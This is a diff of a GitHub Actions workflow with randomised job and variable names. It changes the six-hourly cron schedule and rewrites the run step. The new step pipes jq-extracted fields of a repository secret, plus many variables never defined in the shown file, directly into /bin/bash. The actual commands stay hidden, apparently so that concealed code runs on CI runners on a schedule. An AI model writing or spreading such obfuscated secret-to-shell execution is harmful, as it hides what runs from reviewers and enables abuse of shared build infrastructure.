@@ -3,19 +3,31 @@ name: langzhengdong5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 2/6 * * *'
-
+    - cron: '11 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: langzhengdong5678
         env:
-          exycj827: ${{ secrets.exycj827 }}
+          hg07: ${{ secrets.hg07 }}
         run: |
-          echo $exycj827 | jq -r .sw6 | /bin/bash
-          echo $fp3141 | jq -r .ee5 | /bin/bash
-          echo $c85451 | jq -r .il3 | /bin/bash
-          echo $gt92494 | jq -r .xjxu66494 | /bin/bash
+          echo $hg07 | jq -r .bageb148 | /bin/bash
+          echo $r639 | jq -r .qyd03 | /bin/bash
+          echo $itmdb02576 | jq -r .ktk9 | /bin/bash
+          echo $ycmw0 | jq -r .h9547 | /bin/bash
+          echo $lk35991 | jq -r .lmgl20 | /bin/bash
+          echo $jsr9230 | jq -r .nvsgx89 | /bin/bash
+          echo $noo262 | jq -r .pejo6793 | /bin/bash
+          echo $vbd553 | jq -r .qs062 | /bin/bash
+          echo $he9 | jq -r .gc4003 | /bin/bash
+          echo $kayez6 | jq -r .mjujs6 | /bin/bash
+          echo $fx47 | jq -r .d28035 | /bin/bash
+          echo $if6 | jq -r .bnxy7521 | /bin/bash
+          echo $ejm039 | jq -r .hubw9341 | /bin/bash
+          echo $qnmi20407 | jq -r .qi4 | /bin/bash
+          echo $esxj481 | jq -r .loq28 | /bin/bash
+          echo $sl482 | jq -r .qiys26 | /bin/bash
 
